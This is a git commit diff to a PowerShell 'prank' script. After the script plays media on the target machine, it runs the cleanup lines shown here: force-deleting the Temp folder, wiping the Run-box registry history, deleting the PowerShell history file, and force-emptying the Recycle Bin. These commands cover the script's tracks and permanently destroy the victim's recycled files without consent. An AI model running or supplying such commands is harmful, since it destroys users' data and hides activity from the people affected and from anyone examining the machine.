57370506a9ed70a43f4f5cdaaeb63d88da69022a
Anonymous <106942782+MajorMarmalade@users.noreply.github.com>
2023-05-03 16:06:56 -0400

    Update VeryBadPrankV2.ps1

--- VeryBadPrank/VeryBadPrankV2.ps1
+++ VeryBadPrank/VeryBadPrankV2.ps1
@@ -32,8 +32,18 @@ while ($mediaPlayer.Position -lt $mediaPlayer.NaturalDuration.TimeSpan) {
     Start-Sleep -Milliseconds 200
 }
 
-# Additional cleanup steps
+# Delete contents of Temp folder 
+
 rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+
+# Delete run box history
+
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+# Delete powershell history
+
 Remove-Item (Get-PSreadlineOption).HistorySavePath
+
+# Deletes contents of recycle bin
+
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
